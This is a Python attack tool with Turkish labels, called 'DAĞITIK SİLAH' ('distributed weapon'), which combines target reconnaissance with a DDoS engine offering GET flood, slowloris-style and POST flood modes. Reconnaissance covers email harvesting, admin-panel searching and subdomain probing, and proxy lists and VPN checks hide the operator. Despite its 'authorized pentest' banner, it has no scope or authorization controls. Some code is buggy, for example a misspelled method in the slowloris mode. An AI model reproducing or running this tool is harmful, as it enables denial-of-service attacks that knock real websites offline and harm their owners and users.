#!/usr/bin/env python3
"""
DAĞITIK SİLAH - Tek Script Versiyonu
Özellikler:
- Koordineli DDoS
- Bilgi Toplama (OSINT)
- Proxy/VPN Desteği
- Anonimlik Koruması
- Hedef Analizi
"""

import asyncio
import aiohttp # type: ignore
import json
import socket
import ssl
import sys
import os
import re
import time
import random
import secrets
import ipaddress
import threading
from datetime import datetime
from urllib.parse import urlparse, urljoin

# ============================================================
# RENKLER
# ============================================================
class Renk:
    KIRMIZI = '\033[91m'
    YESIL = '\033[92m'
    SARI = '\033[93m'
    MAVI = '\033[94m'
    MOR = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    SON = '\033[0m'

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Renk.KIRMIZI}{Renk.BOLD}
    ╔═══════════════════════════════════════════╗
    ║         DAĞITIK SİLAH v3.0               ║
    ║    Yetkili Pentest Aracı                 ║
    ╚═══════════════════════════════════════════╝
    {Renk.SON}""")

# ============================================================
# GÜVENLİK & ANONİMLİK
# ============================================================
class Guvenlik:
    def __init__(self):
        self.proxy_list = []
        self.vpn_kontrol = False
        self.tor_kontrol = False
        self.anonim_mod = False
        self.session = None
        
    def ip_bul(self):
        """Kendi IP'ni bul"""
        import requests
        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=5)
            return r.json()['ip']
        except requests.RequestException:
            try:
                r = requests.get('https://httpbin.org/ip', timeout=5)  # type: ignore
                return r.json().get('origin', socket.gethostbyname(socket.gethostname()))
            except requests.RequestException:
                try:
                    return socket.gethostbyname(socket.gethostname())
                except OSError:
                    return '127.0.0.1'
    
    def vpn_kontrol_et(self):
        """VPN çalışıyor mu kontrol et"""
        import requests
        try:
            ip = self.ip_bul()
            r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
            data = r.json()
            
            print(f"\n{Renk.CYAN}[i] IP Bilgileri:{Renk.SON}")
            print(f"    IP: {ip}")
            print(f"    ISP: {data.get('org', 'Bilinmiyor')}")
            print(f"    Ülke: {data.get('country_name', 'Bilinmiyor')}")
            print(f"    VPN: {data.get('vpn', False)}")
            print(f"    Proxy: {data.get('proxy', False)}")
            print(f"    Tor: {data.get('tor', False)}")
            
            if data.get('vpn') or data.get('proxy') or data.get('tor'):
                print(f"{Renk.YESIL}[✓] ANONİM BAĞLANTI TESPİT EDİLDİ{Renk.SON}")
                self.anonim_mod = True
                return True
            else:
                print(f"{Renk.SARI}[!] VPN/PROXY/TOR TESPİT EDİLMEDİ{Renk.SON}")
                print(f"{Renk.SARI}[!] Gerçek IP'niz görünüyor!{Renk.SON}")
                cevap = input(f"{Renk.KIRMIZI}Devam etmek istiyor musun? (e/h): {Renk.SON}")
                if cevap.lower() != 'e':
                    sys.exit(0)
                return False
        except (requests.RequestException, ValueError, TypeError):
            print(f"{Renk.SARI}[!] VPN kontrolü yapılamadı{Renk.SON}")
            return False
    
    def proxy_yukle(self, kaynak='free'):
        """Proxy listesi yükle"""
        import requests
        print(f"{Renk.CYAN}[i] Proxy listesi yükleniyor...{Renk.SON}")
        
        if kaynak == 'free':
            kaynaklar = [
                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
                'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt'
            ]
            
            for url in kaynaklar:
                try:
                    r = requests.get(url, timeout=10)
                    for line in r.text.strip().split('\n'):
                        if ':' in line:
                            self.proxy_list.append(f'http://{line.strip()}')
                except requests.RequestException:
                    pass
        
        print(f"{Renk.YESIL}[✓] {len(self.proxy_list)} proxy yüklendi{Renk.SON}")
        return self.proxy_list
    
    def anonim_session_al(self):
        """Anonim session oluştur"""
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        
        if self.proxy_list and self.anonim_mod:
            proxy = secrets.choice(self.proxy_list)
            timeout = aiohttp.ClientTimeout(total=10)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            )
            print(f"{Renk.CYAN}[i] Proxy kullanılıyor: {proxy[:30]}...{Renk.SON}")
            return self.session, proxy
        else:
            timeout = aiohttp.ClientTimeout(total=10)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            )
            return self.session, None
    
    def header_rastgele(self):
        """Rastgele User-Agent ve header üret"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36'
        ]
        
        headers = {
            'User-Agent': secrets.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        return headers

# ============================================================
# BİLGİ TOPLAMA (OSINT)
# ============================================================
class BilgiToplama:
    def __init__(self, hedef_url, guvenlik):
        self.hedef_url = hedef_url
        self.guvenlik = guvenlik
        self.parsed = urlparse(hedef_url)
        self.domain = self.parsed.netloc
        self.bilgiler = {}
        
    async def tarama_baslik(self):
        """HTTP header bilgilerini topla"""
        print(f"{Renk.CYAN}[*] Header bilgileri taranıyor...{Renk.SON}")
        _, proxy = self.guvenlik.anonim_session_al()
        session = self.guvenlik.session
        
        try:
            async with session.get(self.hedef_url, headers=self.guvenlik.header_rastgele(), proxy=proxy, ssl=False) as resp:
                self.bilgiler['status'] = resp.status
                self.bilgiler['headers'] = dict(resp.headers)
                self.bilgiler['server'] = resp.headers.get('Server', 'Bilinmiyor')
                self.bilgiler['x_powered_by'] = resp.headers.get('X-Powered-By', 'Yok')
                self.bilgiler['content_type'] = resp.headers.get('Content-Type', 'Bilinmiyor')
                
                print(f"{Renk.YESIL}[✓] Header bilgileri alındı{Renk.SON}")
                print(f"    Server: {self.bilgiler['server']}")
                print(f"    Powered By: {self.bilgiler['x_powered_by']}")
                print(f"    Status: {self.bilgiler['status']}")
                
                # Güvenlik header'larını kontrol et
                guvenlik_header = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options', 
                                  'Strict-Transport-Security', 'Content-Security-Policy']
                print(f"\n{Renk.CYAN}[*] Güvenlik Header Analizi:{Renk.SON}")
                for h in guvenlik_header:
                    if h in resp.headers:
                        print(f"    {Renk.YESIL}[✓]{Renk.SON} {h}: {resp.headers[h]}")
                    else:
                        print(f"    {Renk.KIRMIZI}[X]{Renk.SON} {h}: EKSİK!")
        except Exception as e:
            print(f"{Renk.KIRMIZI}[X] Header taraması başarısız: {e}{Renk.SON}")
    
    async def teknoloji_tespit(self):
        """Site teknolojilerini tespit et"""
        print(f"\n{Renk.CYAN}[*] Teknoloji tespiti yapılıyor...{Renk.SON}")
        _, proxy = self.guvenlik.anonim_session_al()
        session = self.guvenlik.session
        
        try:
            async with session.get(self.hedef_url, headers=self.guvenlik.header_rastgele(), proxy=proxy, ssl=False) as resp:
                html = await resp.text()
                
                # WordPress tespiti
                if '/wp-content/' in html or 'wp-json' in html:
                    self.bilgiler['cms'] = 'WordPress'
                    print(f"    {Renk.YESIL}[✓]{Renk.SON} CMS: WordPress")
                    
                    # WordPress versiyonu
                    wp_version = re.search(r'ver=([0-9.]+)', html)
                    if wp_version:
                        self.bilgiler['wp_version'] = wp_version.group(1)
                        print(f"    WP Versiyon: {wp_version.group(1)}")
                
                # Joomla tespiti
                elif '/media/jui/' in html or 'joomla' in html.lower():
                    self.bilgiler['cms'] = 'Joomla'
                    print(f"    {Renk.YESIL}[✓]{Renk.SON} CMS: Joomla")
                
                # Drupal tespiti
                elif 'drupal.js' in html or 'Drupal.settings' in html:
                    self.bilgiler['cms'] = 'Drupal'
                    print(f"    {Renk.YESIL}[✓]{Renk.SON} CMS: Drupal")
                
                # JavaScript kütüphaneleri
                js_scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', html)
                js_libs = []
                for js in js_scripts:
                    if 'jquery' in js.lower():
                        js_libs.append('jQuery')
                    elif 'bootstrap' in js.lower():
                        js_libs.append('Bootstrap')
                    elif 'react' in js.lower():
                        js_libs.append('React')
                    elif 'vue' in js.lower():
                        js_libs.append('Vue.js')
                    elif 'angular' in js.lower():
                        js_libs.append('Angular')
                
                if js_libs:
                    self.bilgiler['js_libraries'] = list(set(js_libs))
                    print(f"    JS Kütüphaneleri: {', '.join(set(js_libs))}")
                
                # Google Analytics
                if 'google-analytics.com' in html or 'gtag(' in html:
                    print(f"    {Renk.SARI}[!]{Renk.SON} Google Analytics Tespit Edildi")
                
                # Cloudflare
                if 'cloudflare' in html.lower() or '__cfduid' in html:
                    self.bilgiler['cdn'] = 'Cloudflare'
                    print(f"    {Renk.SARI}[!]{Renk.SON} CDN: Cloudflare (DDoS koruması var!)")
                    
        except Exception as e:
            print(f"{Renk.KIRMIZI}[X] Teknoloji tespiti başarısız: {e}{Renk.SON}")
    
    async def email_bul(self):
        """Email adreslerini bul"""
        print(f"\n{Renk.CYAN}[*] Email adresleri taranıyor...{Renk.SON}")
        _, proxy = self.guvenlik.anonim_session_al()
        session = self.guvenlik.session
        
        try:
            async with session.get(self.hedef_url, headers=self.guvenlik.header_rastgele(), proxy=proxy, ssl=False) as resp:
                html = await resp.text()
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', html)
                emails = list(set([e for e in emails if self.domain.split(':')[0] in e]))
                
                if emails:
                    self.bilgiler['emails'] = emails
                    print(f"{Renk.YESIL}[✓] {len(emails)} email bulundu:{Renk.SON}")
                    for e in emails[:5]:
                        print(f"    - {e}")
                else:
                    print(f"    Email bulunamadı")
        except Exception as e:
            print(f"{Renk.KIRMIZI}[X] Email taraması başarısız{Renk.SON}")
    
    async def link_bul(self):
        """Tüm linkleri bul"""
        print(f"\n{Renk.CYAN}[*] Sayfadaki linkler taranıyor...{Renk.SON}")
        _, proxy = self.guvenlik.anonim_session_al()
        session = self.guvenlik.session
        
        try:
            async with session.get(self.hedef_url, headers=self.guvenlik.header_rastgele(), proxy=proxy, ssl=False) as resp:
                html = await resp.text()
                links = re.findall(r'href=["\']([^"\']+)["\']', html)
                links = list(set([urljoin(self.hedef_url, l) for l in links if l and not l.startswith('#') and not l.startswith('javascript:')]))
                
                self.bilgiler['links'] = links
                print(f"{Renk.YESIL}[✓] {len(links)} link bulundu{Renk.SON}")
                
                # Yönetici panellerini ara
                admin_keywords = ['admin', 'login', 'panel', 'yonetim', 'dashboard', 'cpanel', 'wp-admin', 'administrator']
                admin_links = [l for l in links if any(k in l.lower() for k in admin_keywords)]
                if admin_links:
                    print(f"{Renk.KIRMIZI}[!] YÖNETİM PANELİ BULUNDU!{Renk.SON}")
                    for al in admin_links[:3]:
                        print(f"    {Renk.KIRMIZI}[!]{Renk.SON} {al}")
                    self.bilgiler['admin_links'] = admin_links
        except Exception as e:
            print(f"{Renk.KIRMIZI}[X] Link taraması başarısız{Renk.SON}")
    
    async def dns_bilgi(self):
        """DNS bilgilerini topla"""
        print(f"\n{Renk.CYAN}[*] DNS bilgileri toplanıyor...{Renk.SON}")
        
        try:
            # IP adresini bul
            ip = socket.gethostbyname(self.domain.split(':')[0])
            self.bilgiler['ip'] = ip
            print(f"    IP: {ip}")
            
            # Alt domainleri dene
            common_subdomains = ['www', 'mail', 'ftp', 'admin', 'panel', 'api', 'dev', 'test', 'blog', 'forum']
            print(f"\n{Renk.CYAN}[*] Alt domain tespiti:{Renk.SON}")
            for sub in common_subdomains:
                try:
                    sub_ip = socket.gethostbyname(f"{sub}.{self.domain.split(':')[0]}")
                    print(f"    {Renk.YESIL}[✓]{Renk.SON} {sub}.{self.domain.split(':')[0]} -> {sub_ip}")
                    if 'subdomains' not in self.bilgiler:
                        self.bilgiler['subdomains'] = []
                    self.bilgiler['subdomains'].append(f"{sub}.{self.domain.split(':')[0]}")
                except:
                    pass
        except Exception as e:
            print(f"{Renk.KIRMIZI}[X] DNS sorgusu başarısız: {e}{Renk.SON}")
    
    async def sayfa_analizi(self):
        """Sayfa içeriğini analiz et"""
        print(f"\n{Renk.CYAN}[*] Sayfa içeriği analiz ediliyor...{Renk.SON}")
        _, proxy = self.guvenlik.anonim_session_al()
        session = self.guvenlik.session
        
        try:
            async with session.get(self.hedef_url, headers=self.guvenlik.header_rastgele(), proxy=proxy, ssl=False) as resp:
                html = await resp.text()
                
                # Form bul
                forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', html)
                if forms:
                    self.bilgiler['forms'] = forms
                    print(f"{Renk.SARI}[!] {len(forms)} form bulundu{Renk.SON}")
                    for f in forms[:3]:
                        print(f"    Form action: {f}")
                
                # Gizli inputlar
                hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', html)
                if hidden_inputs:
                    print(f"{Renk.SARI}[!] {len(hidden_inputs)} gizli input bulundu{Renk.SON}")
                
                # Yorum satırları
                comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
                useful_comments = [c.strip() for c in comments if len(c.strip()) > 10]
                if useful_comments:
                    self.bilgiler['comments'] = useful_comments
                    print(f"{Renk.KIRMIZI}[!] {len(useful_comments)} yorum bulundu (bilgi sızdırabilir!){Renk.SON}")
                    for c in useful_comments[:3]:
                        print(f"    {c[:100]}...")
                        
        except Exception as e:
            print(f"{Renk.KIRMIZI}[X] Sayfa analizi başarısız{Renk.SON}")
    
    async def tumunu_tara(self):
        """Tüm taramaları çalıştır"""
        print(f"\n{Renk.MOR}{'='*60}{Renk.SON}")
        print(f"{Renk.BOLD}HEDEF ANALİZİ BAŞLATILDI: {self.hedef_url}{Renk.SON}")
        print(f"{Renk.MOR}{'='*60}{Renk.SON}")
        
        await self.tarama_baslik()
        await self.dns_bilgi()
        await self.teknoloji_tespit()
        await self.email_bul()
        await self.link_bul()
        await self.sayfa_analizi()
        
        return self.bilgiler

# ============================================================
# DDoS MOTORU
# ============================================================
class DDoSEngine:
    def __init__(self, hedef_url, guvenlik, threads=500):
        self.hedef_url = hedef_url
        self.guvenlik = guvenlik
        self.threads = threads
        self.running = False
        self.stats = {"requests": 0, "errors": 0, "start_time": None}
        self.parsed = urlparse(hedef_url)
        
    async def flood(self, worker_id):
        """Tek worker flood döngüsü"""
        _, proxy = self.guvenlik.anonim_session_al()
        session = self.guvenlik.session
        
        while self.running:
            try:
                async with session.get(
                    self.hedef_url,
                    headers=self.guvenlik.header_rastgele(),
                    proxy=proxy,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=2)
                ) as resp:
                    self.stats["requests"] += 1
                    
                    # Her 100 istekte bir proxy değiştir
                    if self.stats["requests"] % 100 == 0 and self.guvenlik.proxy_list:
                        _, proxy = self.guvenlik.anonim_session_al()
                        
            except asyncio.CancelledError:
                break
            except:
                self.stats["errors"] += 1
                
    async def slowloris(self, worker_id):
        """Slowloris tipi saldırı"""
        _, proxy = self.guvenlik.anim_session_al()
        session = self.guvenlik.session
        
        while self.running:
            try:
                # Kısmi istek gönder (header'ları parça parça)
                async with session.get(
                    self.hedef_url,
                    headers=self.guvenlik.header_rastgele(),
                    proxy=proxy,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    self.stats["requests"] += 1
                    await asyncio.sleep(5)  # Bağlantıyı açık tut
            except:
                self.stats["errors"] += 1
    
    async def post_flood(self, worker_id):
        """POST flood"""
        _, proxy = self.guvenlik.anonim_session_al()
        session = self.guvenlik.session
        
        data = {
            'username': 'admin' + str(random.randint(1000, 9999)),
            'password': 'test123',
            'login': 'submit'
        }
        
        while self.running:
            try:
                async with session.post(
                    self.hedef_url,
                    data=data,
                    headers=self.guvenlik.header_rastgele(),
                    proxy=proxy,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=2)
                ) as resp:
                    self.stats["requests"] += 1
            except:
                self.stats["errors"] += 1
    
    async def saldiri_baslat(self, mod='flood', sure=30):
        """Saldırıyı başlat"""
        self.running = True
        self.stats["start_time"] = time.time()
        
        print(f"\n{Renk.KIRMIZI}{'='*60}{Renk.SON}")
        print(f"{Renk.BOLD}SALDIRI BAŞLATILDI!{Renk.SON}")
        print(f"    Hedef: {self.hedef_url}")
        print(f"    Worker: {self.threads}")
        print(f"    Mod: {mod.upper()}")
        print(f"    Süre: {sure} saniye")
        print(f"{Renk.KIRMIZI}{'='*60}{Renk.SON}")
        
        # Worker'ları başlat
        workers = []
        for i in range(self.threads):
            if mod == 'flood':
                task = asyncio.create_task(self.flood(i))
            elif mod == 'slowloris':
                task = asyncio.create_task(self.slowloris(i))
            elif mod == 'post':
                task = asyncio.create_task(self.post_flood(i))
            workers.append(task) # type: ignore
        
        # Geri sayım
        for i in range(5, 0, -1):
            print(f"\r{Renk.KIRMIZI}Saldırı {i}...{Renk.SON}", end="")
            await asyncio.sleep(1)
        print(f"\r{Renk.KIRMIZI}SALDIRI AKTİF!{Renk.SON} {' '*20}")
        
        # İstatistik gösterimi
        start = time.time()
        while time.time() - start < sure:
            await asyncio.sleep(1)
            elapsed = time.time() - start
            rps = self.stats["requests"] / elapsed if elapsed > 0 else 0
            print(f"\r{Renk.SARI}[i] Süre: {int(elapsed)}s | İstek: {self.stats['requests']} | "
                  f"Hata: {self.stats['errors']} | RPS: {rps:.0f}{Renk.SON}", end="")
        
        # Durdur
        self.running = False
        
        # Worker'ları temizle
        for w in workers:
            w.cancel()
        
        await asyncio.gather(*workers, return_exceptions=True)
        
        elapsed = time.time() - self.stats["start_time"]
        rps = self.stats["requests"] / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{Renk.YESIL}{'='*60}{Renk.SON}")
        print(f"{Renk.BOLD}SALDIRI TAMAMLANDI{Renk.SON}")
        print(f"    Süre: {elapsed:.1f}s")
        print(f"    Toplam İstek: {self.stats['requests']}")
        print(f"    Toplam Hata: {self.stats['errors']}")
        print(f"    Ortalama RPS: {rps:.0f}")
        print(f"{Renk.YESIL}{'='*60}{Renk.SON}")

# ============================================================
# ANA MENÜ
# ============================================================
async def main():
    logo()
    
    # Güvenlik katmanı
    guvenlik = Guvenlik()
    
    print(f"{Renk.CYAN}[i] Sistem kontrol ediliyor...{Renk.SON}")
    gercek_ip = guvenlik.ip_bul()
    print(f"    Gerçek IP: {gercek_ip}")
    
    print(f"\n{Renk.SARI}[i] VPN/Proxy kontrolü yapılıyor...{Renk.SON}")
    guvenlik.vpn_kontrol_et()
    
    print(f"\n{Renk.SARI}[i] Proxy listesi yükleniyor...{Renk.SON}")
    guvenlik.proxy_yukle()
    
    while True:
        logo()
        print(f"\n{Renk.CYAN}{Renk.BOLD}ANA MENÜ{Renk.SON}")
        print(f"{Renk.MOR}{'='*60}{Renk.SON}")
        print(f"    {Renk.YESIL}[1]{Renk.SON} Hedef Belirle ve Analiz Et")
        print(f"    {Renk.YESIL}[2]{Renk.SON} DDoS Saldırısı Başlat")
        print(f"    {Renk.YESIL}[3]{Renk.SON} Hızlı Saldırı (Analiz + DDoS)")
        print(f"    {Renk.YESIL}[4]{Renk.SON} Proxy/Güvenlik Ayarları")
        print(f"    {Renk.YESIL}[5]{Renk.SON} Çıkış")
        print(f"{Renk.MOR}{'='*60}{Renk.SON}")
        
        secim = input(f"\n{Renk.BOLD}Seçim: {Renk.SON}").strip()
        
        if secim == '1':
            hedef = input(f"\n{Renk.CYAN}Hedef URL: {Renk.SON}").strip()
            if not hedef.startswith('http'):
                hedef = 'http://' + hedef
            
            print(f"\n{Renk.SARI}[!] Hedef analiz ediliyor...{Renk.SON}")
            bilgi = BilgiToplama(hedef, guvenlik)
            sonuc = await bilgi.tumunu_tara()
            
            print(f"\n{Renk.YESIL}[✓] Analiz tamamlandı!{Renk.SON}")
            input(f"{Renk.CYAN}Devam etmek için Enter...{Renk.SON}")
            
        elif secim == '2':
            hedef = input(f"\n{Renk.CYAN}Hedef URL: {Renk.SON}").strip()
            if not hedef.startswith('http'):
                hedef = 'http://' + hedef
            
            print(f"\n{Renk.CYAN}Saldırı Modu:{Renk.SON}")
            print(f"    {Renk.YESIL}[1]{Renk.SON} Flood (Hızlı GET isteği)")
            print(f"    {Renk.YESIL}[2]{Renk.SON} Slowloris (Yavaş bağlantı)")
            print(f"    {Renk.YESIL}[3]{Renk.SON} POST Flood")
            mod_secim = input("Mod: ").strip()
            modlar = {'1': 'flood', '2': 'slowloris', '3': 'post'}
            mod = modlar.get(mod_secim, 'flood')
            
            try:
                threads = int(input(f"Worker sayısı (100-2000) [500]: ") or "500")
                threads = max(100, min(2000, threads))
            except:
                threads = 500
            
            try:
                sure = int(input(f"Saldırı süresi (saniye) [30]: ") or "30")
            except:
                sure = 30
            
            ddos = DDoSEngine(hedef, guvenlik, threads)
            await ddos.saldiri_baslat(mod, sure)
            
            input(f"{Renk.CYAN}Devam etmek için Enter...{Renk.SON}")
            
        elif secim == '3':
            hedef = input(f"\n{Renk.CYAN}Hedef URL: {Renk.SON}").strip()
            if not hedef.startswith('http'):
                hedef = 'http://' + hedef
            
            # Önce analiz
            print(f"\n{Renk.SARI}[!] Hedef analiz ediliyor...{Renk.SON}")
            bilgi = BilgiToplama(hedef, guvenlik)
            sonuc = await bilgi.tumunu_tara()
            
            # Sonra DDoS
            print(f"\n{Renk.SARI}[!] DDoS başlatılıyor...{Renk.SON}")
            try:
                threads = int(input(f"\nWorker sayısı [500]: ") or "500")
                threads = max(100, min(2000, threads))
            except:
                threads = 500
                
            try:
                sure = int(input(f"Saldırı süresi [30]: ") or "30")
            except:
                sure = 30
            
            ddos = DDoSEngine(hedef, guvenlik, threads)
            await ddos.saldiri_baslat('flood', sure)
            
            input(f"{Renk.CYAN}Devam etmek için Enter...{Renk.SON}")
            
        elif secim == '4':
            print(f"\n{Renk.CYAN}Güvenlik Ayarları:{Renk.SON}")
            print(f"    1. Proxy listesini yenile")
            print(f"    2. VPN kontrolü yap")
            print(f"    3. IP bilgilerini göster")
            alt = input("Seçim: ").strip()
            
            if alt == '1':
                guvenlik.proxy_yukle()
            elif alt == '2':
                guvenlik.vpn_kontrol_et()
            elif alt == '3':
                print(f"    IP: {guvenlik.ip_bul()}")
            
            input(f"{Renk.CYAN}Devam etmek için Enter...{Renk.SON}")
            
        elif secim == '5':
            print(f"\n{Renk.KIRMIZI}Kapatılıyor...{Renk.SON}")
            break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Renk.KIRMIZI}[!] Kullanıcı tarafından durduruldu{Renk.SON}")
    except Exception as e:
        print(f"\n{Renk.KIRMIZI}[X] Kritik hata: {e}{Renk.SON}")